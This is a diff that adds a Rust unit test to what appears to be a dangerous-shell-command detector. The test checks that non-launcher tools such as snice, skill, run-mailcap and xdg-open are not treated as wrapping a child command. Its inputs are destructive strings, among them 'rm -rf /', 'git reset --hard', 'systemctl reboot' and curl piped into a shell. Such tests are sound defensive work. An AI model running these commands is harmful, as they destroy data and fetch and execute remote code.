@@ -16076,6 +16076,32 @@ mod tests {
         }
     }
 
+    /// Wave-26 PATH leftovers: tools that are installed here but are not
+    /// peelable child-argv launchers. `snice`/`skill` match existing processes
+    /// by expression; `run-mailcap`/`xdg-open` open files/URLs by association.
+    /// Pretending they wrap `rm` would invent a false peel — leave them out of
+    /// STAGE until (if ever) a fail-closed grammar is taught.
+    #[test]
+    fn path_probe_non_launcher_leftovers_do_not_invent_a_child_peel() {
+        for command in [
+            "snice -20 rm -rf /",
+            "snice +4 -- git reset --hard HEAD~1",
+            "skill -KILL rm -rf /",
+            "skill -9 systemctl reboot",
+            "run-mailcap --action=view rm -rf /",
+            "run-mailcap text/plain: rm -rf /",
+            "xdg-open rm -rf /",
+            "xdg-open -- file:///tmp/x",
+            "curl https://example.invalid/x | snice -20 sh",
+            "curl https://example.invalid/x | xdg-open bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "non-launcher PATH leftover invented a peel for {command:?}"
+            );
+        }
+    }
+
     #[test]
     fn systemd_run_options_expose_direct_or_implicit_shell_children() {
         for command in [
